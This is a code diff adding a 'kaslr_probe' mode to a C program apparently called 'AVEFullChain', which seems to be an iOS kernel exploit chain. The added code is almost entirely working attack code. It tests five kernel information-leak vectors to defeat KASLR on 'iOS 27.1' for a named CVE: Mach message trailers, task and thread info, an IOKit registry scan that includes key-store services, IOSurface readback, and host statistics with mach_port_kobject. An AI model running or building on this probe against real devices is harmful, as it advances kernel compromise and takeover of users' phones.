@@ -12752,6 +12752,380 @@ vps_cd_done:
 
         rlog("=== HEAP_REUSE complete ===\n");
 
+    } else if (strcmp(mode, "kaslr_probe") == 0) {
+        /*
+         * kaslr_probe — Multi-vector KASLR bypass probe
+         *
+         * Tests multiple known kernel info leak vectors on iOS 27.1:
+         *   Phase 1: Mach message trailer leak (CVE-2020-27950 pattern)
+         *   Phase 2: task_info / proc_info kernel pointer exposure
+         *   Phase 3: IOKit registry property scan for pointer-like values
+         *   Phase 4: IOSurface property readback after create/lookup cycle
+         *   Phase 5: host_info / host_statistics kernel data
+         *
+         * CVE-2026-112665 ("determine kernel memory layout") is live on
+         * 27.1. Its fix was "improved state management" — same language as
+         * the classic Mach trailer leak. This probe systematically tests
+         * the known vectors.
+         *
+         * Usage: kaslr_probe [phase]
+         *   phase: 0=all, 1-5=specific phase
+         */
+        int phase = (argc > 2) ? atoi(argv[2]) : 0;
+        rlog("=== KASLR_PROBE: Multi-vector kernel info leak test ===\n");
+        rlog("Device: iOS 27.1, target CVE-2026-112665\n\n");
+
+        /* Phase 1: Mach message trailer leak */
+        if (phase == 0 || phase == 1) {
+            rlog("--- Phase 1: Mach message trailer leak ---\n");
+            rlog("Testing extended trailers for uninitialized kernel data...\n\n");
+
+            mach_port_t port;
+            kern_return_t kr = mach_port_allocate(mach_task_self(),
+                MACH_PORT_RIGHT_RECEIVE, &port);
+            if (kr != KERN_SUCCESS) {
+                rlog("mach_port_allocate failed: 0x%x\n", kr);
+            } else {
+                kr = mach_port_insert_right(mach_task_self(), port, port,
+                    MACH_MSG_TYPE_MAKE_SEND);
+
+                /* Send a simple message to ourselves */
+                struct {
+                    mach_msg_header_t hdr;
+                    mach_msg_body_t body;
+                    char pad[64];
+                } send_msg;
+                memset(&send_msg, 0, sizeof(send_msg));
+                send_msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+                send_msg.hdr.msgh_size = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t);
+                send_msg.hdr.msgh_remote_port = port;
+                send_msg.hdr.msgh_local_port = MACH_PORT_NULL;
+                send_msg.hdr.msgh_id = 0x41414141;
+
+                kr = mach_msg(&send_msg.hdr, MACH_SEND_MSG, send_msg.hdr.msgh_size,
+                    0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+                rlog("Send: 0x%x\n", kr);
+
+                /* Receive with maximum trailer */
+                struct {
+                    mach_msg_header_t hdr;
+                    mach_msg_body_t body;
+                    char data[256];
+                    mach_msg_max_trailer_t trailer;
+                } recv_msg;
+                memset(&recv_msg, 0xCC, sizeof(recv_msg));
+
+                /* Request all trailer elements */
+                mach_msg_option_t opts = MACH_RCV_MSG |
+                    MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0) |
+                    MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_AUDIT);
+                kr = mach_msg(&recv_msg.hdr, opts,
+                    0, sizeof(recv_msg), port, 0, MACH_PORT_NULL);
+                rlog("Recv: 0x%x\n", kr);
+
+                if (kr == KERN_SUCCESS) {
+                    /* Dump the trailer area */
+                    uint8_t *tstart = (uint8_t *)&recv_msg + recv_msg.hdr.msgh_size;
+                    size_t tlen = sizeof(recv_msg) - recv_msg.hdr.msgh_size;
+                    if (tlen > 256) tlen = 256;
+                    rlog("Trailer area (%zu bytes from offset %u):\n", tlen, recv_msg.hdr.msgh_size);
+                    int suspicious = 0;
+                    for (size_t i = 0; i + 7 < tlen; i += 8) {
+                        uint64_t val = *(uint64_t *)(tstart + i);
+                        if (val == 0 || val == 0xCCCCCCCCCCCCCCCCULL) continue;
+                        rlog("  +%03zu: 0x%016llx", i, (unsigned long long)val);
+                        if ((val >> 40) == 0xFFFFFE || (val >> 40) == 0xFFFFFF) {
+                            rlog(" *** KERNEL POINTER! ***");
+                            suspicious++;
+                        }
+                        rlog("\n");
+                    }
+                    if (suspicious > 0)
+                        rlog("  Found %d potential kernel pointers!\n", suspicious);
+                    else
+                        rlog("  No kernel pointers detected in trailer\n");
+                }
+                mach_port_destroy(mach_task_self(), port);
+            }
+            rlog("\n");
+        }
+
+        /* Phase 2: task_info kernel pointer exposure */
+        if (phase == 0 || phase == 2) {
+            rlog("--- Phase 2: task_info / thread_info pointer leak ---\n");
+
+            /* TASK_DYLD_INFO often contains slide info */
+            struct task_dyld_info dyld_info;
+            mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
+            kern_return_t kr = task_info(mach_task_self(), TASK_DYLD_INFO,
+                (task_info_t)&dyld_info, &cnt);
+            rlog("TASK_DYLD_INFO: kr=0x%x\n", kr);
+            if (kr == KERN_SUCCESS) {
+                rlog("  all_image_info_addr: 0x%llx\n",
+                     (unsigned long long)dyld_info.all_image_info_addr);
+                rlog("  all_image_info_size: 0x%llx\n",
+                     (unsigned long long)dyld_info.all_image_info_size);
+                rlog("  all_image_info_format: %d\n", dyld_info.all_image_info_format);
+                if ((dyld_info.all_image_info_addr >> 40) == 0xFFFFFE ||
+                    (dyld_info.all_image_info_addr >> 40) == 0xFFFFFF) {
+                    rlog("  *** KERNEL ADDRESS DETECTED! ***\n");
+                }
+            }
+
+            /* TASK_VM_INFO — may leak kernel object addresses */
+            task_vm_info_data_t vm_info;
+            cnt = TASK_VM_INFO_COUNT;
+            kr = task_info(mach_task_self(), TASK_VM_INFO,
+                (task_info_t)&vm_info, &cnt);
+            rlog("TASK_VM_INFO: kr=0x%x\n", kr);
+            if (kr == KERN_SUCCESS) {
+                rlog("  virtual_size: 0x%llx\n", (unsigned long long)vm_info.virtual_size);
+                rlog("  resident_size: 0x%llx\n", (unsigned long long)vm_info.resident_size);
+                rlog("  phys_footprint: 0x%llx\n",
+                     (unsigned long long)vm_info.phys_footprint);
+                /* Scan all 64-bit fields for kernel-like values */
+                uint64_t *vm_fields = (uint64_t *)&vm_info;
+                size_t nfields = sizeof(vm_info) / 8;
+                for (size_t i = 0; i < nfields; i++) {
+                    if ((vm_fields[i] >> 40) == 0xFFFFFE ||
+                        (vm_fields[i] >> 40) == 0xFFFFFF) {
+                        rlog("  *** field[%zu] = 0x%llx KERNEL PTR ***\n",
+                             i, (unsigned long long)vm_fields[i]);
+                    }
+                }
+            }
+
+            /* TASK_EXTMOD_INFO */
+            task_extmod_info_data_t extmod;
+            cnt = TASK_EXTMOD_INFO_COUNT;
+            kr = task_info(mach_task_self(), TASK_EXTMOD_INFO,
+                (task_info_t)&extmod, &cnt);
+            rlog("TASK_EXTMOD_INFO: kr=0x%x\n", kr);
+            if (kr == KERN_SUCCESS) {
+                uint64_t *em_fields = (uint64_t *)&extmod;
+                for (size_t i = 0; i < cnt * sizeof(natural_t) / 8; i++) {
+                    if (em_fields[i] != 0)
+                        rlog("  field[%zu] = 0x%llx\n", i,
+                             (unsigned long long)em_fields[i]);
+                }
+            }
+
+            /* thread_info on current thread */
+            thread_identifier_info_data_t tid_info;
+            cnt = THREAD_IDENTIFIER_INFO_COUNT;
+            kr = thread_info(mach_thread_self(), THREAD_IDENTIFIER_INFO,
+                (thread_info_t)&tid_info, &cnt);
+            rlog("THREAD_IDENTIFIER_INFO: kr=0x%x\n", kr);
+            if (kr == KERN_SUCCESS) {
+                rlog("  thread_id: 0x%llx\n", (unsigned long long)tid_info.thread_id);
+                rlog("  thread_handle: 0x%llx\n",
+                     (unsigned long long)tid_info.thread_handle);
+                rlog("  dispatch_qaddr: 0x%llx\n",
+                     (unsigned long long)tid_info.dispatch_qaddr);
+                if ((tid_info.thread_handle >> 40) == 0xFFFFFE ||
+                    (tid_info.thread_handle >> 40) == 0xFFFFFF)
+                    rlog("  *** thread_handle is KERNEL PTR! ***\n");
+            }
+            rlog("\n");
+        }
+
+        /* Phase 3: IOKit registry property scan */
+        if (phase == 0 || phase == 3) {
+            rlog("--- Phase 3: IOKit registry property scan ---\n");
+            rlog("Scanning accessible IOKit services for pointer-like property values...\n\n");
+
+            const char *service_names[] = {
+                "IOSurfaceRoot", "AppleAVE2Driver", "AppleAVD",
+                "AppleH13CamIn", "IOUserEthernetController",
+                "AppleMobileFileIntegrity", "AppleCredentialManager",
+                "AppleKeyStore", "IOHIDSystem",
+                NULL
+            };
+            for (int si = 0; service_names[si]; si++) {
+                io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching(service_names[si]));
+                if (!svc) { rlog("  %s: not found\n", service_names[si]); continue; }
+
+                CFMutableDictionaryRef props = NULL;
+                kern_return_t kr = IORegistryEntryCreateCFProperties(svc, &props,
+                    kCFAllocatorDefault, 0);
+                if (kr != KERN_SUCCESS || !props) {
+                    rlog("  %s: props failed 0x%x\n", service_names[si], kr);
+                    IOObjectRelease(svc);
+                    continue;
+                }
+                CFIndex pcount = CFDictionaryGetCount(props);
+                rlog("  %s: %ld properties\n", service_names[si], (long)pcount);
+
+                const void **keys = malloc(sizeof(void*) * pcount);
+                const void **vals = malloc(sizeof(void*) * pcount);
+                if (keys && vals) {
+                    CFDictionaryGetKeysAndValues(props, keys, vals);
+                    int found = 0;
+                    for (CFIndex i = 0; i < pcount; i++) {
+                        if (CFGetTypeID(vals[i]) != CFNumberGetTypeID()) continue;
+                        int64_t v = 0;
+                        CFNumberGetValue((CFNumberRef)vals[i], kCFNumberSInt64Type, &v);
+                        if (((uint64_t)v >> 40) == 0xFFFFFE ||
+                            ((uint64_t)v >> 40) == 0xFFFFFF) {
+                            char kb[256] = {0};
+                            CFStringGetCString((CFStringRef)keys[i], kb,
+                                sizeof(kb), kCFStringEncodingUTF8);
+                            rlog("    LEAK? %s = 0x%llx\n", kb,
+                                 (unsigned long long)v);
+                            found++;
+                        }
+                    }
+                    if (!found) rlog("    No pointer-like values\n");
+                }
+                if (keys) free(keys);
+                if (vals) free(vals);
+                CFRelease(props);
+                IOObjectRelease(svc);
+            }
+            rlog("\n");
+        }
+
+        /* Phase 4: IOSurface property leak via create/lookup cycle */
+        if (phase == 0 || phase == 4) {
+            rlog("--- Phase 4: IOSurface create/lookup property leak ---\n");
+
+            CFMutableDictionaryRef sprops = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int w = 32, h = 32, bpr = 128, alloc = 128 * 32;
+            int pf = 0x42475241; /* BGRA */
+            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+            CFNumberRef an = CFNumberCreate(NULL, kCFNumberIntType, &alloc);
+            CFNumberRef fn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            CFDictionarySetValue(sprops, CFSTR("IOSurfaceWidth"), wn);
+            CFDictionarySetValue(sprops, CFSTR("IOSurfaceHeight"), hn);
+            CFDictionarySetValue(sprops, CFSTR("IOSurfaceBytesPerRow"), bn);
+            CFDictionarySetValue(sprops, CFSTR("IOSurfaceAllocSize"), an);
+            CFDictionarySetValue(sprops, CFSTR("IOSurfacePixelFormat"), fn);
+            CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(an); CFRelease(fn);
+
+            IOSurfaceRef surf = IOSurfaceCreate(sprops);
+            CFRelease(sprops);
+            if (!surf) {
+                rlog("IOSurfaceCreate failed\n");
+            } else {
+                IOSurfaceID sid = IOSurfaceGetID(surf);
+                rlog("Created IOSurface id=%u\n", sid);
+
+                /* Create mach port and look it up */
+                mach_port_t mp = IOSurfaceCreateMachPort(surf);
+                if (mp != MACH_PORT_NULL) {
+                    IOSurfaceRef surf2 = IOSurfaceLookupFromMachPort(mp);
+                    if (surf2) {
+                        rlog("Lookup from MachPort succeeded\n");
+                        /* Check various attributes for stale data */
+                        size_t aw = IOSurfaceGetWidth(surf2);
+                        size_t ah = IOSurfaceGetHeight(surf2);
+                        size_t aalloc = IOSurfaceGetAllocSize(surf2);
+                        size_t abpr = IOSurfaceGetBytesPerRow(surf2);
+                        int32_t uc = IOSurfaceGetUseCount(surf2);
+                        rlog("  width=%zu height=%zu alloc=%zu bpr=%zu uc=%d\n",
+                             aw, ah, aalloc, abpr, uc);
+
+                        /* Check if mapped data contains kernel pointers */
+                        IOSurfaceLock(surf2, 0, NULL);
+                        void *base = IOSurfaceGetBaseAddress(surf2);
+                        if (base) {
+                            uint64_t *data = (uint64_t *)base;
+                            size_t nqw = aalloc / 8;
+                            int found_ptr = 0;
+                            for (size_t i = 0; i < nqw && i < 512; i++) {
+                                if ((data[i] >> 40) == 0xFFFFFE ||
+                                    (data[i] >> 40) == 0xFFFFFF) {
+                                    rlog("  DATA[%zu] = 0x%llx *** KERNEL PTR ***\n",
+                                         i, (unsigned long long)data[i]);
+                                    found_ptr++;
+                                }
+                            }
+                            if (!found_ptr) rlog("  No kernel pointers in surface data\n");
+                        }
+                        IOSurfaceUnlock(surf2, 0, NULL);
+
+                        /* Try reading custom properties */
+                        CFTypeRef cv = IOSurfaceCopyValue(surf2, CFSTR("IOSurfaceAllocSize"));
+                        if (cv) {
+                            if (CFGetTypeID(cv) == CFNumberGetTypeID()) {
+                                int64_t v = 0;
+                                CFNumberGetValue((CFNumberRef)cv, kCFNumberSInt64Type, &v);
+                                rlog("  CopyValue(AllocSize) = %lld (0x%llx)\n",
+                                     (long long)v, (unsigned long long)v);
+                            }
+                            CFRelease(cv);
+                        }
+                        CFRelease(surf2);
+                    }
+                    mach_port_deallocate(mach_task_self(), mp);
+                }
+                CFRelease(surf);
+            }
+            rlog("\n");
+        }
+
+        /* Phase 5: host_info / host_statistics */
+        if (phase == 0 || phase == 5) {
+            rlog("--- Phase 5: host_info / host_statistics ---\n");
+
+            host_basic_info_data_t hbi;
+            mach_msg_type_number_t cnt = HOST_BASIC_INFO_COUNT;
+            kern_return_t kr = host_info(mach_host_self(), HOST_BASIC_INFO,
+                (host_info_t)&hbi, &cnt);
+            rlog("HOST_BASIC_INFO: kr=0x%x\n", kr);
+            if (kr == KERN_SUCCESS) {
+                rlog("  max_cpus=%d avail_cpus=%d memory=%llu\n",
+                     hbi.max_cpus, hbi.avail_cpus,
+                     (unsigned long long)hbi.max_mem);
+                /* Scan for pointers */
+                uint64_t *hf = (uint64_t *)&hbi;
+                for (size_t i = 0; i < sizeof(hbi) / 8; i++) {
+                    if ((hf[i] >> 40) == 0xFFFFFE || (hf[i] >> 40) == 0xFFFFFF)
+                        rlog("  field[%zu] = 0x%llx *** KERNEL PTR ***\n",
+                             i, (unsigned long long)hf[i]);
+                }
+            }
+
+            /* vm_statistics64 — sometimes leaks through padding */
+            vm_statistics64_data_t vmstat;
+            cnt = HOST_VM_INFO64_COUNT;
+            kr = host_statistics64(mach_host_self(), HOST_VM_INFO64,
+                (host_info64_t)&vmstat, &cnt);
+            rlog("HOST_VM_INFO64: kr=0x%x, count=%u\n", kr, cnt);
+            if (kr == KERN_SUCCESS) {
+                uint64_t *vs = (uint64_t *)&vmstat;
+                for (size_t i = 0; i < sizeof(vmstat) / 8; i++) {
+                    if ((vs[i] >> 40) == 0xFFFFFE || (vs[i] >> 40) == 0xFFFFFF)
+                        rlog("  vmstat[%zu] = 0x%llx *** KERNEL PTR ***\n",
+                             i, (unsigned long long)vs[i]);
+                }
+                rlog("  free_count=%llu active=%llu inactive=%llu wire=%llu\n",
+                     (unsigned long long)vmstat.free_count,
+                     (unsigned long long)vmstat.active_count,
+                     (unsigned long long)vmstat.inactive_count,
+                     (unsigned long long)vmstat.wire_count);
+            }
+
+            /* mach_port_kobject — test on task port */
+            natural_t kotype = 0;
+            mach_vm_address_t kaddr = 0;
+            kr = mach_port_kobject(mach_task_self(), mach_task_self(),
+                &kotype, (mach_port_t *)&kaddr);
+            rlog("mach_port_kobject(task_self): kr=0x%x type=%u addr=0x%llx\n",
+                 kr, kotype, (unsigned long long)kaddr);
+            if (kr == KERN_SUCCESS && kaddr != 0) {
+                if ((kaddr >> 40) == 0xFFFFFE || (kaddr >> 40) == 0xFFFFFF)
+                    rlog("  *** KERNEL OBJECT ADDRESS LEAKED! ***\n");
+            }
+            rlog("\n");
+        }
+
+        rlog("=== KASLR_PROBE complete ===\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
